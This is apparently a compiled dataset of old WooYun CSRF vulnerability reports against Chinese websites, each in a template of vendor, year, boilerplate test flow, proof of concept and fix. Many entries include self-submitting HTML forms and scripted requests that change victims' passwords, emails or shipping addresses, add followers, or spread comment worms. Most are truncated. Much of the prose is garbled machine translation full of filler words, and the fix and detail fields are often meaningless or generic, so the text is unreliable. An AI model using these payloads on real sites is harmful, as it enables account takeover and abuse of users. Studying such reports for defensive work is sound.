**Details**: look atunderthatlinktextcode,isthroughtranslated textinterfacesubmit.interfaceaddresshttps://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textvulnerabilitytextsingle,addonetokenvalidationthen can.lowtranslated textone issue,textnotline.
---

---
### [wooyun-2013-017167] a certain social platforma certain social platformCSRFboost followers
**Vendor**: a certain social platforma certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: noforreferervalidation,noaddtokencausing

**POC**: log ina certain social platforma certain social platformtextwilltext:https://example.com/[redacted] id="fxx" name="fxx" action="https://example.com/[redacted]" method="POST"><input type="text" name="uid" value="1981622273" /><input type="submit" value="submit" /></form><script>document.fxx.submit();</script></body></ht

**Bypass**: Direct exploitation

**Fix**: 1.thissiteCSRFnottranslated text,textgoodothercheck;2.checkPOSTsourceReferer,inPOSTinformation add to token;3.translated text,requesting a reward!
---

---
### [wooyun-2011-02093] a certain search enginegametexthasiframe
**Vendor**: a certain search engine | **Year**: 2011 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain search enginegametext(mobile version)hasoneiframe...

**POC**: poc:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: Fix~~
---

---
### [wooyun-2015-0131322] textOLEarbitrarypasswordresetvulnerability
**Vendor**: textOLE | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textwetexttwo peopleaccountcsrftestcsrftest1wetextlog inaccount1,csrftest,wecomelook atlook atdatapacket,novalidationtokentextnextweconstructPOC as shown belowlog inaccount  csrftest1  wetextquestiontextconstructpoclook atalreadysuccesstextnextweonlyneedresetpasswordthen canIthennottext

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: validationtoken
---

---
### [wooyun-2015-0128451] translated textCSRF vulnerabilitycan modifyuserpassword
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] , emailcanrecoverpasswordPOC

**POC**: <html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="Profile&#91;nickname&#93;" value="wooyun7891" /><input type="hidden" name="Profile&#91;company&#93;" value="" /><input type="hidden" name="Profile&#91;position&#93;" value="" /><input type="hidden

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2012-08542] Aipaione locationCSRF vulnerability
**Vendor**: Aipai | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTinformationtext,notforPOSTsource(Referer)verify,forPOSTinformationinbidtextnottext,causingvulnerabilityoccur.

**POC**: vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="action" value="blog" /><input type="text" name="post" value="true" /><input type="text" name="comment" value="XX" /><input type="submit"

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceReferertextcheckPOSTinformationinbidParameters,translated textwhetherasuser
---

---
### [wooyun-2016-0203945] a certain social platforma certain social platformmobile phoneclienthascsrfvulnerability
**Vendor**: a certain social platform | **Year**: 2016 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: 1.encrypttextdata2.textcsrfprotection,text timessubmittextdatahastext
---

---
### [wooyun-2015-0132561] texto2osystemtranslated textCSRFworm(throughtextwormcomeboost followers)#4
**Vendor**: fanwe.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: https://example.com/[redacted]"status":1,"info":"\u8f6c\u53d1\u6210\u529f"}textintextquestiononeunderpoc2page,returnresult:{"t

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-096292] Doubanmobile phonecsrfreplyarbitrarypost
**Vendor**: Douban | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: POST /group/topic/72292507/comments HTTP/1.1Host: m.douban.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: bid="/dhOdK89vh4"; viewed="1094797"; __utma=30149280.572967685.1408697184.1423144849.1423321947.68;

**POC**: <html><form action="https://example.com/[redacted]" method=post><input type=text value="asdasdasdasdasooyun" name="content" /><input type=submit value="submit" /></form></html>

**Bypass**: Direct exploitation

**Fix**: validationtoken
---

---
### [wooyun-2014-077398] translated textcausingcsrfdatabase dump
**Vendor**: translated textif | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: directlylook atcode:db.mod.php:(576-620):$f = str_replace(array('/', '\\', '.'), '', $filename);$f = dir_safe($f);$backupdir = 'db/' . $f;$backupfilename = './data/backup/'.$backupdir.'/'.$f;if (!is_dir(($d = dirname($backupfilename)))) {jio()->MakeDir($d);}if($usezip) {require_once ROOT_PATH . 'include/func/zip.func.php';}if($method == 'multivol') {$sqldump = '';$tableid = intval(get_param('tableid'));$startfr

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2012-08721] a certain search engineone locationCSRF vulnerability
**Vendor**: a certain search engine | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.

**POC**: vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="ct" value="20008" /><input type="text" name="doc_id" value="a4e806fd700abb68a982fbe9" /><input type="submit" value="submit" /></form><scri

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
### [wooyun-2013-025105] a certain textspaceinseveralvulnerabilitytextexploit
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain textspacehastwo peopleBUGcantextexploit:(1)URLinsidetextistexta certain Internet companynumbercode,textthenistext,canthroughsourcereferertextwhentextusera certain Internet company;(2)blog posttextinimageifisNo.threetextwebsiteimageif,willputimagetexttoa certain Internet companyserveron, textifa certain Internet companytextfailedwhen, No.threetextthencandirectlytext,ifthistextisphptextoutputif,translated textBypassadoptphptextoutputimagecontent,ifa certain Internet companytextifthenreturntextcontent,ifhasrefereriftranslated texta certain Internet company,thentexta certain Internet companytextwhentextusertextandtextnameetc.,this waythencantextof course,textcanuse302texttoa certain somegetmethodtextaddress,textCSRFattack

**POC**: (see original)

**Bypass**: filterBypass

**Fix**: textrestrictiontextNo.threetextwebsiteimage
---

---
### [wooyun-2010-0881] a certain social platformblogCSRF vulnerability
**Vendor**: a certain social platform | **Year**: 2010 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: blogpermissionssetasGETsubmit,canintextintextlinkimage,texttargetusertextputpermissions.

**POC**: texthttps://example.com/[redacted] imagelink2.inuserlog inprerequisiteunder,textuserclickthistext,cantextuserI

**Bypass**: Direct exploitation

**Fix**: 1.getmodifyaspostsubmit2.tokentext
---

---
### [wooyun-2015-0118046] translated textcommentfunctionalityCSRF,cancausingallsitetextitemstextcomment,addjunkcomment.
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textcommentfunctionalityCSRF,cancausingallsitetextitemstextcomment,addjunkcomment.

**POC**: itemscommenttext,capture packetslook atunder,foundcantextsubmit.sourceReferertextnotvalidation.look attextthis wayidthenhasonetranslated text :)look atundersource codelinkusePythontextunderlinkIcommenttext~~starttext~~The end!

**Bypass**: Direct exploitation

**Fix**: youtranslated text!
---

---
### [wooyun-2014-049748] textone locationfunctionalitytranslated text(csrf)No.threepart
**Vendor**: VeryCD | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textfortextprogramtextsendtranslated text,threetextsendtext..textthistextoperationallisgetrequestcapture packetsgetaddress:https://example.com/[redacted] O(n_n)Otext~

**POC**: textfortextprogramtextsendtranslated text,threetextsendtext..textthistextoperationallisgetrequestcapture packetsgetaddress:https://example.com/[redacted] O(n_n)Otext~

**Bypass**: Direct exploitation

**Fix**: token,andtextaddtextthis kind ofoperationwhenadd avalidationcode,oristextquestiontext,nottextbetextpointthentext.
---

---
### [wooyun-2015-0126409] translated text csrfone issue
**Vendor**: 352.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifyusertext,textpacket:modifysuccess:textcsrfmaliciouslink,main code:xmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("account=woo99&sex=1&birthday=2015-07-01&marry=0&province=16&regCity=65&provinceAdd=16&city=67&regArea=&cellphoneNumber=13500000000&homeTelephoneNumber=010-88888888

**POC**: textyoutextlargetext,requesting a reward!!

**Bypass**: Direct exploitation

**Fix**: validationrefereraddtoken
---

---
### [wooyun-2013-023628] textcloudcsrfcantranslated textaddress
**Vendor**: textcloudofficial | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textVendorsendtextaddresslocationisGET,textrequestno token,canandVendorcoordinatetranslated textmethod(textnamedphonetextaddress......)requestas followshttps://example.com/[redacted] srchostaddresstextaffectedtranslated text,addressthentranslated textcome.

**POC**: texta certain Vendortranslated text peopletest

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2015-090857] a certain communicationsVendora certain translated textcancancausingfiledatabesteal
**Vendor**: a certain communications equipment vendor | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: aboutthisvulnerability,textforotherwebvulnerabilitycometextcancanlook attogethercomeimpactnotlarge,butItextforfortranslated textnotextroutercometext,thisforusercometranslated textistextissecurityissue.textforthisvulnerabilityisCSRF tokentext,soItranslated texthandleastext.texttest,translated textonetranslated textcometry,textgamealltextcometextandtext.

**POC**: 1.a certain communicationsVendorTD-LTEnotextrouter,typenumberB593s-850,text500largetext,textlargeonproduct,translated textonUtextenterlineFTPtextetc.functionality,overwritetextcantext250text,text.texthasissue:textintextonhasonecsrf tokenstealissue,throughhttp://[IP redacted]

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-036391] textcommunityCSRFcanconstructworm
**Vendor**: text | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: issuetextuse:https://example.com/[redacted]

**POC**: sendtext"text"whentexttothisaddress:https://example.com/[redacted] type="hidden" name="requestMethod" value="POST"><input type="hidden" name="requestURL" value="http" value="//t.iqiyi.com/api/feed/addChat.php"><input type="hidden" name="notsync" value=""><input type="hidden" nam

**Bypass**: Direct exploitation

**Fix**: controltextquestionsource
---

---
### [wooyun-2013-022895] translated textexploitcsrfcanhijackaccount
**Vendor**: translated text | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifyemaillocationnotvalidationtoken,canthroughonetextheartconstructformcomemodifyuseremail.textforemailneedtextonetext,socanthroughonenumbertextcometranslated textemail.

**POC**: POC:<html><body><form name="csrf" action="https://example.com/[redacted]" method="POST"><input type=text name=section value="basicinfo"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7@wooyun.org

**Bypass**: Direct exploitation

**Fix**: translated textanduserinformationoperationallshouldneedtexttokentext20rank,requesting a reward.
---

---
### [wooyun-2013-025901] a certain securityforumcsrftextotherusertext.
**Vendor**: a certain security vendor | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain securityforumtranslated text,clicktextimage.imageaddressas:https://example.com/[redacted]

**POC**: clickthistexta certain securityforumthentext:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: do not know.
---

---
### [wooyun-2013-021151] a certain textplatformCSRFcancausingtextaccountbehijack
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textonlyis onetextcsrf,translated texttoforbusinessoccurtext,canhijacktextaccounttextsendtext,textself-assessedetc.textastext,texthasnottranslated textlow.as shown,bindtextaccountlocation,bind apinoadopttexttoken,textcausingcsrf.

**POC**: astextsimulationattacktext,useonefriendtextaccountcometest,testtextandnottextitstextastest.constructmaliciouspage,textclick.<img src=https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: text
---

---
### [wooyun-2013-017638] a certain social platformSAEtextdeveloperdoes not needtextfastauthentication
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textdeveloperauthentication,thentoa certain social platformdeveloperforumreplytextundertextcode,putXXtranslated text.text:https://example.com/[redacted]

**POC**: https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addvalidationtext.
---

---
### [wooyun-2013-036093] a certain communityone locationcsrfvulnerabilitycantextaccounttext
**Vendor**: fmi.com.cn | **Year**: 2013 | **Type**: network design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: network design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify network design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: GET www.fmi.com.cn/index.php/User/logout/ HTTP/1.1

**Bypass**: Direct exploitation

**Fix**: nottextarbitrarytext~
---

---
### [wooyun-2013-027335] Aili.comCSRFhijackuseraccount
**Vendor**: aili.com | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifypasswordtextnotextcsrfdefense,no tokenvalue.nottextthisonetext,alltextallnotexttoCSRFissue.

**POC**: testcode<html><head><title>CSRF TEST</title></head><body onload="javascript:fireForms()"><script language="JavaScript">var pauses = new Array( "1344" );function pausecomp(millis){var date = new Date();var curDate = null;do { curDate = new Date(); }while(curDate-date < millis);}function fireForms(){var c

**Bypass**: Direct exploitation

**Fix**: addtranslated texttokenvalue
---

---
### [wooyun-2014-062986] translated textmain site3 peoplecsrf
**Vendor**: a certain video site | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: commenttextistesteffecthttps://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: ..token
---

---
### [wooyun-2015-0164471] a certain e-commerce platformtextCSRFaddshipping address
**Vendor**: a certain e-commerce platformtext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1,https://example.com/[redacted] action="https://example.com/[redacted]" method="POST"><input type="hidden" name="action" value="DeliverAddressMgr" /><input type="hidden" name="event&#95;submit&#95;do&#95;save" value="anything" /><input type="hidden" name="from" value="mbis" /><input type="hidden" name="isFrame" value="fa

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0117747] translated textvulnerabilitysmall package(one)
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: textifthennottext,directlyontextandtextonCSRF POCcode.textcapture packetstool,thenclickfollowenterlinecapture packets,capture packetsrequestdataIthennottext.capture packetsrequestdatatextsingletext:text/user/followthisdirectorysubmit:user=IDtextisnotokenvalidation.undertextweconstructonePOCform!code is as follows:<html><head><meta charset="utf-8"><title>SCRF POC</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="user" value

**Bypass**: Direct exploitation

**Fix**: addtokenvalidation.
---

---
### [wooyun-2013-027258] a certain social platformshouldistextafterone issuetextGETtypeCSRFsenda certain social platformworm
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textlocationcansendtexta certain social platform.textrequestisPOST,textGETtextcan.so,POCasloadonetextimage:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textistextpointsecurity,GET POSTtext,textcheckTOKEN,textgoodtextREFERER
---

---
### [wooyun-2013-035612] textcloudzonetextwbvulnerability
**Vendor**: textcloudofficial | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1. textcloudzoneuploadtranslated textnotext,canuploadswffile.youcanlook atItranslated texthttps://example.com/[redacted] publish posttext,canloadarbitraryswf,thistextswftextallownetworkingvalueasinternal.youcanlook atItextreplyhttps://example.com/[redacted] youalltext.textnextthenistextonecanreadzonetokenandtextspecifiedpostsendtogethertextiftextheartifcanwhile(1){do}swf,thentexttozoneselftext,thensendonepost,textthentext<textnottextpointpointone timesonewb>

**POC**: Itranslated text

**Bypass**: Direct exploitation

**Fix**: ontranslated textvalidationtextseemstranslated text
---

---
### [wooyun-2013-017155] a certain intranslated textCSRF
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain intranslated text,log inafterenterlinetext,nottextcsrfcheck,textusepost,textsametranslated textget.sametext,forreferernottextsufficientcheck.

**POC**: 1:throughpersonalinheart,translated textundertext2:largetextfriendtranslated text,effecttranslated textvulnerabilitytranslated text...

**Bypass**: Direct exploitation

**Fix**: 1:validationreferer;2:addtokenvalidation;
---

---
### [wooyun-2012-014234] textCSRF,canstealuseremail
**Vendor**: a certain Internet company | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain emailserviceCSRF,textcopycanaswantas.text? usePOST? text? hasSID? text?hasreferer? look atontranslated textalltext,textitstextnottextonetext.demoisforwarduseremailtospecifiedemail,textnotextquestion20RANKtranslated textvulnerability.proveintranslated text.

**POC**: 1.sendtextemailtextneedattackuser,texton peopletextswf2. cantranslated textfunctionalitytext,textandemailsametext,flashlargetranslated textin,textBypassreferercheck.3.look atlook atIthisflashtotextistext4.look atthisflashaftertext5.textonepoint,textgetSIDtexta certain Internet company,for convenienceI,inURLinthenhasSID!inNo.4textin,canlook attocodeinItextsid.thatonlyisbecauseItoo lazy totextcode. textplayertranslated text,Iunable tothroughtextmethodgeturl,translated textsingle,IonlyneedtextIcontrolserversendtogetheronerequest,thenservicetextcheckreferer,thenreturnsidanditstextParameterstextflashthencan.

**Bypass**: Direct exploitation

**Fix**: youlook attext.
---

---
### [wooyun-2012-016142] js hijacktranslated texta certain video sitetranslated text
**Vendor**: a certain video site | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]]=cookielist&e[]=mini_panel&s=mini&cb=anytextalltextthatinside,htmlalltext.translated textreferenceinformation?

**POC**: text

**Bypass**: Direct exploitation

**Fix**: textunderreferer
---

---
### [wooyun-2015-0108371] translated textCSRF vulnerability(impactcanresetpassword)
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thenwecapture packetsthenconstructpoc

**POC**: goodweuseselfaccounttestunderlook atbindsuccessthenIthencanrecoverpassword!

**Bypass**: Direct exploitation

**Fix**: add atoken
---

---
### [wooyun-2013-019564] texta certain social platforma certain social platformboost followersvulnerability..
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated text,inpageinsidetranslated textoneimagecodethenline,translated textsingle.textforqingblogcannottranslated textaddressimage,onlytextcanfirebugtextthenline.Iisnotranslated text,textishastranslated text,thistranslated text peopletextfollowers,textiscan.translated text.translated textwooyunbrothertest...textforthatqingarticleTitle,andtranslated text.thenistranslated text,texteveryoneclickentercome,goodExecutionthataddfansimg text~ translated text~

**POC**: https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: text,thisthistext,cantextFixtext?orFix,textseveraltextgoodtext?
---

---
### [wooyun-2012-09438] a certain social platforma certain social platforma certain siteCSRF vulnerability
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated text,usertranslated textlog inweibo.cn,textformobile versionuserandtextuser.inacceptGETinformationwhen,notforGETsource(Referer)verify,also does notinGETinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.a certain social platforma certain social platformPADtranslated textallsitealltextCSRFprotection,aftertranslated text~

**POC**: senda certain social platformhttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addsourcetext~textforgsidtext~nottext,usePOSTreplacetextGET?
---

---
### [wooyun-2012-013847] a certain Internet companycsrf,textpasswordtexthasonetext
**Vendor**: a certain Internet company | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thisvulnerabilitytranslated textnottext,textlineandtranslated textcloseusermobile phoneemail.forusertextcancanistext,fora certain Internet companycancantextlargetext,usertranslated text.a certain Internet companypassportclosemobile phoneemail,usedirectlyGETlink,nousesidauthentication,so,you know what to do,come people<img src>totextuserneedauthenticationafterusetext,for exampleemailetc.,sendtextemailtextonthisimg srctextneedattackuser,useronlytextoneopenemail,notneedtranslated textoperation,mobile phoneemailthentext...

**POC**: textcomeinformationemailcome,look attothattranslated text,intextnottext?enterpassportlook atoneunder.

**Bypass**: Direct exploitation

**Fix**: thisyoutextistext..
---

---
### [wooyun-2014-087803] whenwhentextone locationCSRFtextfollow
**Vendor**: whenwhentext | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: site:https://example.com/[redacted]

**POC**: POST /callback/add_friends.php?1418964916807 HTTP/1.1Host: f.dangdang.comProxy-Connection: keep-aliveContent-Length: 36Accept: */*Origin: https://example.com/[redacted] XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 S

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-051259] a certain translated textpublishtexttwotextCSRF
**Vendor**: a certain portal site | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textquestion:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: referer
---

---
### [wooyun-2015-098434] phpcmstranslated textCSRF
**Vendor**: phpcms | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: phpcmsadmin backendtranslated textalltexttoken,buttexttokentextistexthasurlin,socanconstructtranslated textadmin backendhomepageobtainpc_hash.wecanusetothisdedecmstexthttps://example.com/[redacted]

**POC**: phpcmsadmin backendtranslated textalltexttoken,buttexttokentextistexthasurlin,socanconstructtranslated textadmin backendhomepageobtainpc_hash.wecanusetothisdedecmstexthttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: //$_GET[pc_hash]
---

---
### [wooyun-2015-0101575] translated textallsitetranslated textcausingcross-siterequest forgery(CSRF)(canallsiteboost followersetc.)
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textallsitetranslated textcausingcross-siterequest forgery(CSRF)(canallsiteboost followersetc.).

**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF   POC</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="domain" value="********"/></form><script>document.forms[0].submit();</script></body></

**Bypass**: Direct exploitation

